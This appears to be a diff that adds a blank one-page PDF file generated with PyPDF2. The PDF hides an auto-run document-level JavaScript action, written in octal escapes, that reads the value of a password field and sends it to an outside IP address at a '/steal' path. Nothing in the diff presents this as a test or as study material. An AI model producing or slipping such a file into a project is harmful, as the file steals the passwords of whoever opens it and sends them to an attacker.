@@ -1,0 +1,58 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<<
+/Type /Pages
+/Count 1
+/Kids [ 4 0 R ]
+>>
+endobj
+2 0 obj
+<<
+/Producer (PyPDF2)
+>>
+endobj
+3 0 obj
+<<
+/Type /Catalog
+/Pages 1 0 R
+/Names <<
+/JavaScript <<
+/Names [ (08bca65c\055b6f7\055480a\055a6a5\0555eb82984dbe9) 5 0 R ]
+>>
+>>
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Resources <<
+>>
+/MediaBox [ 0 0 612 792 ]
+/Parent 1 0 R
+>>
+endobj
+5 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (\012const\040pw\040\075\040document\056querySelector\050\047\043password\047\051\056value\073\012fetch\050\047https\072\057\05746\056101\056166\056225\057steal\077pw\075\047\040\053\040encodeURIComponent\050pw\051\054\040\173mode\072\047no\055cors\047\175\051\073\012)
+>>
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000074 00000 n 
+0000000114 00000 n 
+0000000262 00000 n 
+0000000352 00000 n 
+trailer
+<<
+/Size 6
+/Root 3 0 R
+/Info 2 0 R
+>>
+startxref
+676
+%%EOF
